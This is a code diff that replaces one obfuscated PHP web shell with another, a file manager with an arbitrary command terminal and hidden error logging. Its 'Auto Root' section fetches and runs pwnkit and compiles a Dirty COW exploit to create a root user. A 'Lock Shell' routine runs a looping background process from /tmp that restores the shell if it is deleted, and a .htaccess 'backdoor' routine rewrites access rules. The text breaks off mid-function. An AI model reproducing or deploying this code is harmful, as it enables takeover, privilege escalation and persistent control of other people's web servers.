-			if ($_POST['ty'.'pe'] == "fi"."le") {
-				echo '<input type="hidden" name="type" value="fi'.'le">';;
-			} else {
-				echo '<input type="hidden" name="type" value="di'.'r">';;
-			}
-			echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
-			</form><br>';
-		} else {
-			red("Fai"."led to Cha"."nge Da"."te !");
-		}
-	} else {
-		$det = "da"."te";
-		$ftm = "fi"."le"."mti"."me";
-		$b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
-		if ($_POST['ty'.'pe'] == "fi"."le") {
-			echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
-		} else {
-			echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
-		}
-		echo '<form method="post">
-		New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
-		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-		<input type="hidden" name="pilih" value="ubahtanggal">';
-		if ($_POST['ty'.'pe'] == "fi"."le") {
-			echo '<input type="hidden" name="type" value="fi'.'le">';;
-		} else {
-			echo '<input type="hidden" name="type" value="di'.'r">';;
-		}
-		echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
-		</form><br>';
-	}
-} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "dunlut") {
-	$dunlute = $_POST['loknya'];
-	if ($fxt($dunlute) && isset($dunlute)) {
-		if ($ird($dunlute)) {
-			dunlut($dunlute);
-		} elseif ($idr($fl)) {
-			red("That is Di"."rec"."tory, Not Fi"."le -_-");
-		} else {
-			red("Fi"."le is Not Re"."adab"."le !");
-		}
-	} else {
-		red("Fi"."le Not Fo"."und !");
-	}
-} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "fo"."ld"."er") {
-    if ($isw("./") || $ird("./")) {
-        $loke = $_POST['loknya'];
-        if (isset($_POST['buatfolder'])) {
-            $buatf = $mkd($loke."/".$_POST['fo'.'lde'.'rba'.'ru']);
-            if ($buatf == true) {
-                green("Folder <b>".htmlspecialchars($_POST['fo'.'lde'.'rba'.'ru'])."</b> Created !");
-                echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
-                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-                <input type="hidden" name="pilih" value="folder"></form>';
-            } else {
-                red("Failed to Create folder !");
-                echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
-                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-                <input type="hidden" name="pilih" value="folder"></form>';
+        .upload-submit {
+            float: left;
+            padding: 6.4px 50px;
+            margin-right: 10px;
+            font-weight: bold;
+            background-color: #29292e;
+            border: none;
+            color: #1e9fc7;
+            box-shadow: 1.5px 1.5px #303038;
+            border-radius: 3px;
+        }
+
+        .upload-submit:hover {
+            background-color: #d5dbd6;
+            color: black;
+        }
+
+        .link-shell:hover::after {
+            content: "";
+            border-bottom: 2px solid white;
+            display: block;
+            padding-bottom: 5px;
+            margin-bottom: -7px;
+            animation-name: link-shell;
+            animation-duration: 0.6s;
+        }
+
+        @keyframes link-shell {
+            from {
+                width: 0;
             }
-        } else {
-            echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
-            echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="folder"></form>';
-        }
-    }
-} elseif (isset($_POST['lok'.'nya']) && $_POST['pilih'] == "fi"."le") {
-    if ($isw("./") || $isr("./")) {
-        $loke = $_POST['lok'.'nya'];
-        if (isset($_POST['buatfi'.'le'])) {
-            $buatf = $fpt($loke."/".$_POST['fi'.'lebaru'], "");
-            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) {
-                green("File <b>".htmlspecialchars($_POST['fi'.'lebaru'])."</b> Created !");
-                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
-                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
-                <input type="hidden" name="pilih" value="fi'.'le"></form>';
-            } else {
-                red("Failed to Create File !");
-                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
-                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
-                <input type="hidden" name="pilih" value="fi'.'le"></form>';
+
+            to {
+                width: 100%;
             }
+        }
+
+        .tool-menu li {
+            display: inline-block;
+            font-weight: none;
+            padding: 13px 7px;
+        }
+
+        .tool-menu li a {
+            padding: 7px 30px;
+            color: #1e9fc7;
+            background-color: #29292e;
+            border-radius: 3px;
+            box-shadow: 1.5px 1.5px #303038;
+        }
+
+        .tool-menu li a:hover {
+            background-color: #d5dbd6;
+            color: black;
+            box-shadow: 1.5px 1.5px #d5dbd6;
+        }
+
+        .list-tool {
+            padding: 1px;
+        }
+
+        .settings {
+            float: right;
+            position: relative;
+            margin-top: -250px;
+
+        }
+
+        .settings select {
+            padding: 5.5px 35px;
+            background-color: #303038;
+            border: none;
+            color: white;
+            border-radius: 4px;
+        }
+
+        .select-submit {
+            padding: 6.5px 50px;
+            margin-right: 10px;
+            background-color: #303038;
+            border: none;
+            color: white;
+            border-radius: 4px;
+        }
+
+        .select-submit:hover {
+            background-color: #d5dbd6;
+            color: black;
+        }
+
+        .action-gecko:hover {
+            background-color: #d5dbd6;
+            color: black;
+        }
+
+        .tool-menu-header {
+            margin: -13px 0px;
+        }
+
+        .create {
+            background-color: rgba(0, 0, 0, 0.3);
+            position: fixed;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            top: 0;
+            left: 0;
+            height: 100vh;
+            width: 100vw;
+            animation: modal-box;
+            animation-duration: 0.5s;
+            animation-fill-mode: both;
+
+        }
+
+        @keyframes modal-box {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .modal {
+            border-radius: 10px;
+            background-color: white;
+            color: black;
+            width: 600px;
+            max-width: 100%;
+            padding: 18px;
+        }
+
+        .modal a {
+            background-color: #29292e;
+            padding: 8px 15px;
+            border-radius: 3px;
+        }
+
+        .modal ul {
+            float: right;
+        }
+
+        .modal ul li {
+            display: inline;
+        }
+
+        .btn-modal {
+            background-color: #29292e;
+            color: white;
+            border-radius: 3px;
+            padding: 8px 15px;
+            border: none;
+        }
+
+        .modal input[type="text"] {
+            width: 100%;
+            height: 30px;
+            border-radius: 3px;
+            border: 1px solid black;
+        }
+
+        .fw-bold {
+            font-weight: bold;
+        }
+
+        .file-size {
+            color: #1e9fc7;
+        }
+
+        th {
+            color: #1e9fc7;
+        }
+
+        .fa-folder {
+            color: orange;
+        }
+
+        .fa-file {
+            color: #1e9fc7;
+        }
+
+        .terminal-content {
+            z-index: 10;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            width: 100%;
+            height: 100vh;
+            background-color: rgba(0, 0, 0, 0.5);
+            animation: modal-box;
+            animation-duration: 0.5s;
+            animation-fill-mode: both;
+            font-weight: bold;
+        }
+
+        .terminal-body {
+            margin: auto;
+            margin-top: 60px;
+            z-index: 20;
+            width: 90%;
+            background: white;
+            height: 65vh;
+            color: black;
+            border-radius: 5px;
+        }
+
+        .terminal-body header {
+            text-align: center;
+            padding: 4px;
+            background: #1A1A1D;
+            color: white;
+        }
+
+        .terminal-body header a {
+            float: right;
+            color: black;
+            font-size: large;
+            background-color: white;
+            position: relative;
+            z-index: 11;
+            border-radius: 5px;
+            margin-top: -45px;
+            padding: 10px 30px;
+        }
+
+        .terminal-body header a:hover {
+            background-color: #29292e;
+            color: white;
+            border: 1px solid #303038;
+        }
+
+        .output-terminal {
+            width: 99.5%;
+            height: 100%;
+            color: black;
+            background-color: white;
+        }
+
+        .terminal-input {
+            width: 90%;
+            padding: 6px;
+            margin-left: 1px;
+            border: none;
+            border-bottom: 2px solid black;
+        }
+
+        .terminal-submit {
+            margin: 2.5px;
+            padding: 7.5px 25px;
+            background-color: black;
+            color: white;
+            border: none;
+            border-radius: 3px;
+        }
+
+        .pwd-body {
+            padding: 15px 8px;
+            font-weight: bold;
+        }
+
+
+        .border {
+            border: 1px solid black;
+            border-radius: 2px;
+        }
+
+        .file-box {
+            position: fixed;
+            width: 100%;
+            height: 100vh;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1;
+        }
+
+        .file-content {
+            width: 90%;
+            background-color: white;
+            height: 70%;
+            margin: auto;
+            margin-top: 20px;
+            color: black;
+        }
+
+        .file-content textarea {
+            width: 99.5%;
+            height: 70vh;
+        }
+
+        .file-header {
+            background-color: #1A1A1D;
+            padding: 15px;
+        }
+
+        .file-header ul {
+            list-style: none;
+        }
+
+        .file-header li {
+            display: inline-block;
+            margin: 0px 30px;
+        }
+
+        .file-header li:nth-child(3) {
+            float: right;
+            margin-right: -5px;
+        }
+
+        .file-header li:nth-child(3) a {
+            color: black;
+            font-size: large;
+            background-color: white;
+            z-index: 11;
+            border-radius: 5px;
+            padding: 10px 30px;
+        }
+
+        .file-header li:nth-child(3) a:hover {
+            background-color: #29292e;
+            color: white;
+            border: 1px solid #303038;
+        }
+
+        .file-header li button {
+            color: black;
+            cursor: pointer;
+            font-weight: bold;
+            background: white;
+            font-size: 15px;
+            border: 1px solid white;
+            padding: 10px 15px;
+            margin: -10px -15px;
+            border-radius: 5px;
+        }
+
+        .link-rename {
+            padding: 10px 15px;
+            border: 1px solid white;
+            background-color: white;
+            color: black;
+            border-radius: 5px;
+            margin: -10px -15px;
+        }
+    </style>
+</head>
+<?php
+@set_time_limit(0);
+@clearstatcache();
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+
+
+function Redirect($url, $permanent = false)
+{
+    header('Location: ' . $url, true, $permanent ? 301 : 302);
+
+    exit();
+}
+
+
+
+if (isset($_GET['dir'])) {
+    $cdir = unhex($_GET['dir']);
+    $fungsi[10]($cdir);
+} else {
+    $cdir = $fungsi[9]();
+}
+$get_cwd = $fungsi[9]();
+$scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
+
+?>
+
+<body>
+    <div class="list-shell">
+        <ul>
+            <li><?= $fungsi[11](); ?></li>
+            <li><?= $_SERVER[$fungsi[23]]; ?></li>
+            <li>Server IP : <?= $_SERVER['SERVER_ADDR']; ?> & Your IP : <?= $_SERVER['REMOTE_ADDR']; ?></li>
+            <li>Domains : <?= symlinkDomain(); ?></li>
+            <li>
+                User : <?= $fungsi[22](); ?>
+            </li>
+            <form action="" method="post" enctype="<?= $fungsi[32] ?>">
+                <li><input type="file" name="gecko-file" id=""><input type="submit" class="upload-submit" name="upload-submit" value="Upload"></li>
+            </form>
+        </ul>
+         <div class="tool-menu-header">
+            <div class="list-tool">
+                <ul class="tool-menu">
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&action=terminal" class=""><i class="fa-solid fa-terminal"></i>&nbsp;Terminal</a></li>
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&action=root-terminal" class=""><i class="fa-solid fa-code"></i>&nbsp;Auto Root</a></li>
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=file" class=""><i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File</a></li>
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=folder" class=""><i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder</a></li>
+                    <li><a href="https://www.exploit-db.com/search?q=Linux%20Kernel%20<?= linux_version(); ?>" class=""><i class="fa-solid fa-bug"></i>&nbsp;Localroot Suggester</a></li>
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&lock=shell" class=""><i class="fa-solid fa-lock"></i></i>&nbsp;Lock Shell</a></li>
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&lock=file" class=""><i class="fa-solid fa-lock"></i></i>&nbsp;Lock File++</a></li>
+                    <li><a href="?path=<?php echo realpath('.'); ?> class=""><i class="fa-solid fa-house"></i>&nbsp;BACK HOME</a></li>
+                </ul>
+            </div>
+        </div>
+        <br>
+    </div>
+    <div class="border">
+        <div class="pwd">
+            <form action="" method="post">
+                <div class="pwd-body">
+                    <?php
+                    $cwd = str_replace("\\", "/", $get_cwd); // untuk dir garis windows
+                    $pwd = explode("/", $cwd);
+                    foreach ($pwd as $id => $val) {
+                        if ($val == '' && $id == 0) {
+                            echo '<a href="?dir=' . hex('/') . '"><i class="fa-solid fa-folder-plus"></i>&nbsp;/ </a>';
+                            continue;
+                        }
+                        if ($val == '') continue;
+                        echo '<a href="?dir=';
+                        for ($i = 0; $i <= $id; $i++) {
+                            echo hex($pwd[$i]);
+                            if ($i != $id) echo hex("/");
+                        }
+                        echo '">' . $val . ' / ' . '</a>';
+                    }
+                    ?>
+                </div>
+                <div class="settings">
+                    <select name="action-gecko" id="" class="action-gecko">
+                        <option value="delete">Delete</option>
+                        <option value="unzip">Unzip</option>
+                    </select>
+                    <input type="submit" class="select-submit" value="Submit" name="gecko-submit">
+                </div>
+        </div>
+        <table style="width:100%;">
+            <thead>
+                <tr>
+                    <th>Name</th>
+                    <th>Size</th>
+                    <th>Permission</th>
+                    <th>Date</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <tbody>
+                <!-- FOLDER NYA -->
+                <?php foreach ($scdir as $dir) : ?>
+                    <?php if ($fungsi[18]($dir)) : ?>
+                        <tr>
+                            <td>
+                                <input type="checkbox" name="check-gecko[]" id="folder" value="<?= $dir; ?>">&nbsp;<label for="folder"><i class="fa-solid fa-folder"></i>&nbsp;<a href="?dir=<?= hex($cwd . "/" . $dir); ?>" class="link-shell"><?= $dir; ?></a>
+                            </td>
+                            <td>[ DIR ]</td>
+                            <td><?php if ($fungsi[19]($fungsi[9]() . '/' . $dir)) echo '<font color="#00ff00">';
+                                elseif (!$fungsi[20]($fungsi[9]() . '/' . $dir)) echo '<font color="red">';
+                                echo perms($fungsi[9]() . '/' . $dir);
+                                ?>
+                            </td>
+                            <td>
+                                <?php echo date(
+                                    "Y-m-d H:i",
+                                    $fungsi[24]($dir)
+                                ); ?>
+                            </td>
+                            <td>
+                                <a href="?dir=<?= hex($fungsi[9]()) ?>&rename=<?= $dir ?>"><i class="fa-solid fa-file-pen"></i></a>&nbsp;<a href="?dir=<?= hex($fungsi[9]()) ?>&chmod=<?= $dir ?>"><i class="fa-solid fa-user-pen"></i></a>&nbsp;
+                            </td>
+                        </tr>
+                    <?php endif; ?>
+                <?php endforeach; ?>
+                <!-- FILE NYA -->
+                <?php foreach ($scdir as $_file) : ?>
+                    <?php if ($fungsi[17]($_file)) : ?>
+                        <tr>
+                            <td>
+                                <input type="checkbox" name="check-gecko[]" id="folder" value="<?= $_file; ?>">&nbsp;<label for="folder"><i class="fa-regular fa-file"></i>&nbsp;<a href="?dir=<?= hex($cwd . "/"); ?>&f=<?= $_file; ?>" class="link-shell"><?= $_file; ?></a>
+                            </td>
+                            <td><?= formatSize($fungsi[21]($_file)); ?></td>
+                            <td>
+                                <?php if ($fungsi[19]($fungsi[9]() . '/' . $_file)) {
+                                    echo '<font color="#00ff00">';
+                                } elseif (!$fungsi[20]($fungsi[9]() . '/' . $_file)) {
+                                    echo '<font color="red">';
+                                }
+                                echo perms($fungsi[9]() . '/' . $_file);
+                                ?>
+                            </td>
+                            <td>
+                                <?php echo date(
+                                    "Y-m-d H:i",
+                                    $fungsi[24]($_file)
+                                ); ?>
+                            </td>
+                            <td>
+                                <a href="?dir=<?= hex($fungsi[9]()) ?>&rename=<?= $_file ?>"><i class="fa-solid fa-file-pen"></i></a>&nbsp;<a href="?dir=<?= hex($fungsi[9]()) ?>&download=<?= $_file ?>"><i class="fa-solid fa-download"></i></a>&nbsp;<a href="?dir=<?= hex($fungsi[9]()) ?>&chmod=<?= $_file ?>"><i class="fa-solid fa-user-pen"></i></a>&nbsp;
+                            </td>
+                        </tr>
+                    <?php endif; ?>
+                <?php endforeach; ?>
+            </tbody>
+        </table>
+    </div>
+    <br>
+    </form>
+    <?php
+    if ($_GET['create'] == True) :
+    ?>
+        <div class="create">
+            <div class="modal">
+                <?php if ($_GET['create'] == "file") :  ?>
+                    <header>
+                        <h2><?= '<i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File'; ?></h2>
+                    </header>
+                    <form action="" method="post">
+                        <input type="text" name="create_file" id="" placeholder="&nbsp;Nama File">
+                    <?php elseif ($_GET['create'] == "folder") : ?>
+                        <header>
+                            <h2><?= '<i class="fa-solid fa-folder-plus">&nbsp;</i>Create Folder'; ?></h2>
+                        </header>
+                        <form action="" method="post">
+                            <input type="text" name="create_folder" id="" placeholder="&nbsp;Nama Folder">
+                        <?php endif; ?>
+                        <ul>
+                            <li><input type="submit" name="submit-modal" class="btn-modal fw-bold" value="Submit"></li>
+                            <li><a href="?dir=<?= hex($fungsi[9]()); ?>">Close</a></li>
+                        </ul>
+                        </form>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php
+    if ($_GET['action'] == "terminal") :
+    ?>
+        <div class="terminal-content">
+            <div class="terminal">
+                <div class="terminal-body">
+                    <header>
+                        <h3><i class="fa-solid fa-terminal"></i>&nbsp;</h3>
+                        <a href="?dir=<?= hex($fungsi[9]()); ?>"><i class="fa-solid fa-xmark"></i></a>
+                    </header>
+                    <form action="" method="post">
+                        <center>
+                            <input type="text" placeholder="uname -a" name="terminal" class="terminal-input" autofocus>
+                            <input type="submit" value=">" name="submit-terminal" class="terminal-submit">
+                        </center>
+                    </form>
+                    <?php if (isset($_POST['submit-terminal'])) :  ?>
+                        <textarea class="output-terminal" disabled><?= htmlspecialchars($fungsi[14]($_POST['terminal'] . " 2>&1")); ?></textarea>
+                    <?php endif; ?>
+                </div>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['action'] == "root-terminal") : ?>
+        <div class="terminal-content">
+            <div class="terminal">
+                <div class="terminal-body">
+                    <header>
+                        <h3><i class="fa-solid fa-terminal"></i>&nbsp;</h3>
+                        <a href="?dir=<?= hex($fungsi[9]()); ?>"><i class="fa-solid fa-xmark"></i></a>
+                    </header>
+                    <form action="" method="post">
+                        <center>
+                            <input type="text" placeholder="root@terminal~#" name="terminal-root" class="terminal-input" autofocus>
+                            <input type="submit" value=">" name="submit-root" class="terminal-submit">
+                        </center>
+                    </form>
+                    <?php if (isset($_POST['submit-root'])) :  ?>
+                        <textarea class="output-terminal" disabled>
+<?php
+                        $terminal = $_POST['terminal-root'];
+                        if ($terminal == "root") {
+                            echo "\n[+] Downloading The source \n";
+                            echo _mad_cmd("wget " . $GLOBALS['fungsi'][34] . " --no-check-certificate");
+                            echo "[!] Chmod file pwnkit....\n";
+                            echo _mad_cmd("chmod +x pwnkit");
+                            echo "[+] Testing if this kernel vulnerable...\n";
+                            echo "[!] This kernel version is " . kernel_angka() . " \n";
+                            if (suggest_exploit() == "5.11") {
+                                echo "[!] This Kernel Maybe Vuln Dirtypipe\n";
+                            } else if (suggest_exploit() == "4.10") {
+
+                                echo "[!] This Kernel Maybe Vuln PTRACE_TRACEME\n";
+                            } else if (suggest_exploit() == "2.6.22" || suggest_exploit() == "3.9." . True . "") {
+
+                                echo _mad_cmd("wget " . $GLOBALS['fungsi'][35] . " -O dirty.c --no-check-certificate");
+                                echo _mad_cmd("gcc -pthread dirty.c -o dirty -lcrypt");
+                                echo _mad_cmd("chmod +x dirty");
+                                echo "Creating Password using 'MrMad'\n";
+                                echo _mad_cmd("./dirty mrmad");
+                                echo "Done rooting please check firts using cat /etc/passwd\n";
+                                echo "You Can running that user using sh firefart@" . $_SERVER['SERVER_ADDR'] . "\n";
+                                echo "DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!\n";
+                                echo "mv /tmp/passwd.bak /etc/passwd";
+                                echo 'Exploit adopted by Christian "FireFart" Mehlmauer';
+                                exit;
+                            } else if (distro_linux() == "Debian" || distro_linux() == "Ubuntu" || distro_linux() == "Centos") {
+                                echo "[!] This Kernel Maybe Vuln Pwnkit\n";
+                            } else if (suggest_exploit() == "5.16.11" || suggest_exploit() == "5.15.25" || suggest_exploit() == "5.10.102") {
+                                echo "This Kernel Maybe Vuln Dirtypipe \n";
+                                echo "Dirty Pipe - CVE-2022-0847\n";
+                                echo "Backconnect source: https://github.com/MadExploits/Reverse-Shell-Payload\n";
+                                echo "Exploit Source: https://github.com/0xIronGoat/dirty-pipe\n";
+                            } else if (suggest_exploit() == "4.19.2" || suggest_exploit() == "4.15." . True . "") {
+                                echo "This Kernel Maybe Vuln Subuid\n";
+                                echo "Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (dbus Method)\n";
+                                echo "Backconnect source: https://github.com/MadExploits/Reverse-Shell-Payload\n";
+                                echo "Exploit Source: https://www.exploit-db.com/download/47165\n";
+                            }
+                            echo _mad_cmd('./pwnkit "id" > mad-pwnkit');
+                            $check_vulnerable = $GLOBALS['fungsi'][27](__DIR__ . "/mad-pwnkit");
+                            $explode_mad_pwkit = explode(" ", $check_vulnerable);
+                            if ($explode_mad_pwkit[0] == "uid=0(root)") {
+                                echo "[~] This Kernel is vulnerable congrats!\n";
+                            } else {
+                                echo "[!] This kernel is not Vulnerable Sorry :)";
+                                return;
+                            }
+                            echo "[+] Giving Permission on mad-pwnkit\n";
+                            echo _mad_cmd("chmod +x mad-pwnkit");
+                            if (!_mad_cmd('./pwnkit "id"')) {
+                                echo "[!] Cannot running pwnkit";
+                            } else {
+                                echo "[!] Done Sir. now u can running on root user!";
+                                exit;
+                            }
+                        }
+?>
+                        </textarea>
+                    <?php endif; ?>
+                </div>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php
+    if (isset($_POST['submit-modal'])) {
+        if ($_POST['create_file']) {
+            $file = $_POST['create_file'];
+            if ($fungsi[25]($file)) {
+                echo success();
+            } else {
+                echo failed();
+            }
+        } elseif ($_POST['create_folder']) {
+            $folder = $_POST['create_folder'];
+            if ($fungsi[26]($folder)) {
+                echo success();
+            } else {
+                echo failed();
+            }
+        }
+    } ?>
+    <br>
+    <?php
+    if (isset($_GET['f'])) :
+    ?>
+        <div class="file-box">
+            <div class="file-content">
+                <form action="" method="post">
+                    <div class="file-header">
+                        <ul>
+                            <li><button type="submit" name="submit-file"><i class="fa-regular fa-floppy-disk"></i>&nbsp;Save</button></li>
+                            <li><a href="?dir=<?= hex($fungsi[9]()) ?>&rename=<?= $_GET['f'] ?>" class="link-rename"><i class="fa-solid fa-pen-to-square"></i>&nbsp;Rename</a></li>
+                            <li> <a href="?dir=<?= hex($fungsi[9]()); ?>"><i class="fa-solid fa-xmark"></i></a></li>
+                        </ul>
+                    </div>
+                    <textarea name="text-file"><?php echo htmlspecialchars($fungsi[27]($_GET['f'])); ?></textarea>
+                </form>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['rename'] == True) : ?>
+        <div class="create">
+            <div class="modal">
+                <header>
+                    <h2><?= $_GET['rename'] ?></h2>
+                </header>
+                <form action="" method="post">
+                    <input type="text" name="rename" id="" placeholder="&nbsp;File/Folder">
+                    <ul>
+                        <li><input type="submit" name="submit-rename" class="btn-modal fw-bold" value="Submit"></li>
+                        <li><a href="?dir=<?= hex($fungsi[9]()); ?>">Close</a></li>
+                    </ul>
+                </form>
+            </div>
+        </div>
+
+    <?php endif; ?>
+    <?php if ($_GET['chmod'] == True) : ?>
+        <div class="create">
+            <div class="modal">
+                <header>
+                    <h2><?= $_GET['chmod'] ?></h2>
+                </header>
+                <form action="" method="post">
+                    <input type="number" style="width:100%" name="chmod" id="" placeholder="&nbsp;775">
+                    <ul>
+                        <li><input type="submit" name="submit-chmod" class="btn-modal fw-bold" value="Submit"></li>
+                        <li><a href="?dir=<?= hex($fungsi[9]()); ?>">Close</a></li>
+                    </ul>
+                </form>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['lock'] == "file") : ?>
+        <div class="create">
+            <div class="modal">
+                <header>
+                    <h2>Lock Files</h2>
+                </header>
+                <form action="" method="post">
+                    <input type="text" name="lock-file" id="" placeholder="&nbsp;File Name">
+                    <ul>
+                        <li><input type="submit" name="submit-lock-file" class="btn-modal fw-bold" value="Submit"></li>
+                        <li><a href="?dir=<?= hex($fungsi[9]()); ?>">Close</a></li>
+                    </ul>
+                </form>
+            </div>
+        </div>
+    <?php endif; ?>
+</body>
+
+</html>
+
+<?php
+
+if ($_GET['lock'] == "shell") {
+    $tmp = "/tmp";
+    _mad_cmd("cp " . namaFile() . " " . $tmp . "/Acx0" . awalanFile(namaFile()) . "wplers0x.do.not.remove.this.Lock");
+    $text = '
+    <?php
+    $tmp = "/tmp";
+    $fileperm = gecko_perm("' . namaFile() . '");
+    gecko_cmd("chmod 444 ' . namaFile() . '");
+    while (True) {
+        if (!file_exists("' . namaFile() . '")) {
+            $var = base64_encode(file_get_contents($tmp . "/Acx0' . awalanFile(namaFile()) . 'wplers0x.do.not.remove.this.Lock"));
+            FiLe_pUt_ConTentS("' . namaFile() . '", base64_decode($var));
+        }
+        if ($fileperm != "0444") {
+            gecko_cmd("chmod 444 ' . namaFile() . '");
+        }
+    }
+    function gecko_cmd($value)
+    {
+        if (function_exists("system")) {
+            sYsTem($value);
+        } else if (function_exists("shell_exec")) {
+            return ShEll_eXeC($value);
+        } else if (function_exists("exec")) {
+            return ExEc($value);
+        } else if (function_exists("passthru")) {
+            return pAsSThRu($value);
+        }
+    }
+    function gecko_perm($flename){
+        return substr(sprintf("%o", fileperms($flename)), -4);
+    }
+    ';
+    if (file_exists('/tmp/Acx0' . awalanFile(namaFile()) . 'wplers0x.do.not.remove.this.Lock')) {
+        FiLe_pUt_ConTentS($tmp . "/as" . pwdnostrip() . "pxha" . awalanFile(namaFile()) . "ndler0.Lock", $text);
+        _mad_cmd("nohup php " . $tmp . "/as" . pwdnostrip() . "pxha" . awalanFile(namaFile()) . "ndler0.Lock &");
+    }
+}
+if ($_GET['backdoor'] == True) {
+    // check if htaccess have this code
+    $file_htaccess = $fungsi[27]($_SERVER[$fungsi[33]] . "/.htaccess");
+    $cari_code = explode('<', $file_htaccess);
+    if (!end($cari_code) == '/FilesMatch>') {
+        // pengecekan nama file sekarang
+        $namafile = $_SERVER['SCRIPT_FILENAME'];
+        $fileUtama = explode("/", $namafile);
+        $htaccess_text = '
+<FilesMatch ".ph*|Ph*|pH*|PH*">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+<FilesMatch "' . end($fileUtama) . '|index.php|index.html|*.png|.htaccess">
+    Order Deny, Allow
+    Allow from all
+</FilesMatch>';
+        $document_root = $_SERVER[$fungsi[33]];
+        $cmd = $fungsi[14]("echo '" . $htaccess_text . "' >> " . $document_root . "/.htaccess");
+        if ($cmd) {
+            echo success();
         } else {
-            echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
-            echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
+            echo failed();
+        }
+    } else {
+        echo failed();
+    }
+}
+
+if (isset($_POST['submit-lock-file'])) {
+    $fileNama = $_POST['lock-file'];
+    if (file_exists($fileNama)) {
+        $tmp = "/tmp";
+        _mad_cmd("cp " . $fileNama . " " . $tmp . "/Acx0" . awalanFile($fileNama) . "wplers0x.do.not.remove.this.Lock");
+        $text = '
+    <?php
+
+    $tmp = "/tmp";
+    $fileperm = gecko_perm("' . $fileNama . '");
+    gecko_cmd("chmod 444 ' . $fileNama . '");
+    while (True) {
+        if (!file_exists("' . $fileNama . '")) {
+            $var = base64_encode(file_get_contents($tmp . "/Acx0' . awalanFile($fileNama) . 'wplers0x.do.not.remove.this.Lock"));
+            FiLe_pUt_ConTentS("' . $fileNama . '", base64_decode($var));
+        }
+        if ($fileperm != "0444"){
+            gecko_cmd("chmod 444 ' . $fileNama . '");
+        }
+    }
+    function gecko_cmd($value)
+    {
+        if (function_exists("system")) {
+            sYsTem($value);
+        } else if (function_exists("shell_exec")) {
+            return ShEll_eXeC($value);
+        } else if (function_exists("exec")) {
+            return ExEc($value);
+        } else if (function_exists("passthru")) {
+            return pAsSThRu($value);
+        }
+    }
+    function gecko_perm($flename){
+        return substr(sprintf("%o", fileperms($flename)), -4);
+    }
+    ';
+        if (file_exists('/tmp/Acx0' . awalanFile($fileNama) . 'wplers0x.do.not.remove.this.Lock')) {
+            FiLe_pUt_ConTentS($tmp . "/acxds" . pwdnostrip() . "" . awalanFile($fileNama) . "ds.Lock", $text);
+            _mad_cmd("nohup php " . $tmp . "/acxds" . pwdnostrip() . "" . awalanFile($fileNama) . "ds.Lock &");
+        }
+    } else {
+        echo failed();
+    }
+}
+
+if (isset($_POST['submit-chmod'])) {
+    $numberChmod = $_POST['chmod'];
+    $chm_o_d = chmod($fungsi[9] . "/" . $_GET['chmod'], is_int($numberChmod));
+    if ($chm_o_d) {
+        echo success();
